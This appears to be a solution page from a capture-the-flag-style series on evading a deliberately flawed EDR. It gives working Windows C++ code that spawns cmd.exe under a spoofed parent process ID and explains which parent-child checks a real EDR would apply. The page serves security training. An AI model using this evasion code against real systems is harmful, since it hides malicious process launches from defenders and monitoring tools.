---
title: "Solution 19: Parent PID Spoofing"
difficulty: hard
category: "Advanced Bypass"
---

[Back to Challenge]({{ '/challenges/19-parent-pid-spoofing/' | relative_url }})

## Overview

The EDR tracks `parentPid` but has zero rules that analyze parent-child relationships. Spoofing the parent PID has no consequences.

## Solution

```cpp
// C++ code to create a process with a spoofed parent PID
#include <windows.h>

void SpawnWithParent(DWORD parentPid) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    
    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    
    auto attrList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
    InitializeProcThreadAttributeList(attrList, 1, 0, &size);
    
    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);
    
    STARTUPINFOEXW si = { sizeof(si) };
    si.lpAttributeList = attrList;
    PROCESS_INFORMATION pi;
    
    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
        (STARTUPINFOW*)&si, &pi);
}
```

```powershell
# PowerShell using Start-Process with parent spoofing
# (requires additional tooling or P/Invoke)
```

## Why It Works

The EDR stores `parentPid` from `PROCESSENTRY32W.th32ParentProcessID` but never checks:
- Is the parent a legitimate process for this child?
- Does the parent-child relationship follow normal Windows process trees?
- Was the parent PID artificially set?

A real EDR would flag anomalies like `cmd.exe` spawned by `svchost.exe` (PID 1234) when that svchost instance typically never spawns command shells.
